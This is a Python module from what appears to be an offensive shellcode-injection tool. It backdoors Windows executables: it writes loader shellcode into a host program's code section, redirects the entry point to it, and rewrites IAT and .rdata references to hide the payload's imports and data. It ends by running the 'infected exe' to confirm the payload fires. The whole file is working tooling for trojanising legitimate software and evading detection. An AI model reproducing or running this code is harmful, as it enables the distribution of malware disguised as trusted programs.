from helper import *
import logging
import time
import logging

from model.carrier import Carrier, DataReuseEntry
from pe.pehelper import *
from model.exehost import *
from observer import observer
from pe.derbackdoorer import PeBackdoor
from pe.superpe import SuperPe
from model.project import Project
from model.settings import Settings

logger = logging.getLogger("Injector")


def inject_exe(
    main_shc_file: FilePath,
    settings: Settings,
    project: Project,
):
    shellcode_in = project.payload.payload_path
    exe_in = settings.inject_exe_in
    exe_out = settings.inject_exe_out
    inject_mode: InjectStyle = settings.inject_mode
    source_style: SourceStyle = settings.source_style

    logger.info("--[ Injecting: {} into: {} -> {}".format(
        shellcode_in, exe_in, exe_out
    ))

    # Read prepared loader shellcode
    # And check if it fits into the target code section
    main_shc = file_readall_binary(main_shc_file)
    l = len(main_shc)
    if l + 128 > project.exe_host.code_section.Misc_VirtualSize:
        logger.error("Error: Shellcode {}+128 too small for target code section {}".format(
            l, project.exe_host.code_section.Misc_VirtualSize
        ))
        return False

    # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
    superpe = SuperPe(exe_in)
    peinj = PeBackdoor(superpe, main_shc, inject_mode)

    if not peinj.injectShellcode():
        logger.error('Could not inject shellcode into PE file!')
        return False

    if not peinj.setupShellcodeEntryPoint():
        logger.error('Could not setup shellcode launch within PE file!')
        return False
    
    if source_style == SourceStyle.iat_reuse:
        injected_fix_iat(superpe, project.carrier, project.exe_host)
    
    if True:
        injected_fix_data(superpe, project.carrier, project.exe_host)

    superpe.write_pe_to_file(exe_out)

    # verify and log
    shellcode = file_readall_binary(shellcode_in)
    shellcode_len = len(shellcode)
    code = extract_code_from_exe_file(exe_out)
    in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
    jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
    if config.debug:
        observer.add_code("exe_extracted_loader", in_code)
        observer.add_code("exe_extracted_jmp", jmp_code)
    #if in_code != shellcode:
    #    raise Exception("Shellcode injection error")


def injected_fix_iat(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
    """replace IAT-placeholders in shellcode with call's to the IAT"""
    code = superpe.get_code_section_data()

    for iatRequest in carrier.get_all_iat_requests():
        if not iatRequest.placeholder in code:
            raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
        destination_virtual_address = exe_host.get_vaddr_of_iatentry(iatRequest.name)
        if destination_virtual_address == None:
            raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
        
        offset_from_code = code.index(iatRequest.placeholder)
        instruction_virtual_address = offset_from_code + exe_host.image_base + exe_host.code_section.VirtualAddress
        logger.info("    Replace {} at VA 0x{:X} with call to IAT at VA 0x{:X}".format(
            iatRequest.placeholder.hex(), instruction_virtual_address, destination_virtual_address
        ))
        jmp = assemble_and_disassemble_jump(
            instruction_virtual_address, destination_virtual_address
        )
        code = code.replace(iatRequest.placeholder, jmp)

    superpe.write_code_section_data(code)


def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
    """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
    # Insert my data into the .rdata section.
    # Chose and save each datareuse_fixup's addres.
    reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()
    if len(reusedata_fixups) == 0:
        # nothing todo
        return
    
    # Put stuff into .rdata section in the PE
    peSection = exe_host.superpe.get_section_by_name(".rdata")
    if peSection == None:
        raise Exception("No .rdata section found, abort")
    
    rm = exe_host.get_rdata_relocmanager()

    if True:  # FIXME this is a hack which is sometimes necessary
        sect_data_copy = peSection.pefile_section.get_data()
        string_off = find_first_utf16_string_offset(sect_data_copy)
        if string_off == None:
            raise Exception("Strings not found in .rdata section, abort")
        if string_off < 100:
            logging.warn("weird: Strings in .rdata section at offset {} < 100".format(string_off))
        rm.add_range(peSection.virt_addr, peSection.virt_addr + string_off)

    # Do all .rdata patches
    for datareuse_fixup in reusedata_fixups:
        # get a hole in the .rdata section to put our data
        hole = rm.find_hole(len(datareuse_fixup.data))
        if hole == None:
            raise Exception("No suitable hole with size {} found in .rdata section, abort".format(
                len(datareuse_fixup.data)
            ))
        fixup_offset_rdata = hole[0]  # the start address of the hole (from start of .rdata)
        rm.add_range(hole[0], hole[1])  # mark it as used
        var_data = datareuse_fixup.data
        superpe.pe.set_bytes_at_offset(fixup_offset_rdata, var_data)
        datareuse_fixup.addr = fixup_offset_rdata + peSection.virt_addr + exe_host.image_base - peSection.raw_addr
        logging.info("    Add data to .rdata at 0x{:X} (off: {}): {}".format(
            datareuse_fixup.addr, fixup_offset_rdata, var_data.decode('utf-16le')))
        fixup_offset_rdata += len(var_data) + 8

    # patch code section
    # replace the placeholder with a LEA instruction to the data we written above
    code = superpe.get_code_section_data()
    for datareuse_fixup in reusedata_fixups:
        if not datareuse_fixup.randbytes in code:
            raise Exception("DataReuse: ID {} not found, abort".format(
                datareuse_fixup.randbytes))
        
        offset_from_datasection = code.index(datareuse_fixup.randbytes)
        instruction_virtual_address = offset_from_datasection + exe_host.image_base + exe_host.code_section.VirtualAddress
        destination_virtual_address = datareuse_fixup.addr
        logger.info("    Replace {} at VA 0x{:X} with LEA {} .rdata 0x{:X}".format(
            datareuse_fixup.randbytes.hex(), instruction_virtual_address, datareuse_fixup.register, destination_virtual_address
        ))
        lea = assemble_lea(
            instruction_virtual_address, destination_virtual_address, datareuse_fixup.register
        )
        code = code.replace(datareuse_fixup.randbytes, lea)
    superpe.write_code_section_data(code)


def verify_injected_exe(exefile: FilePath) -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        exefile,
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1

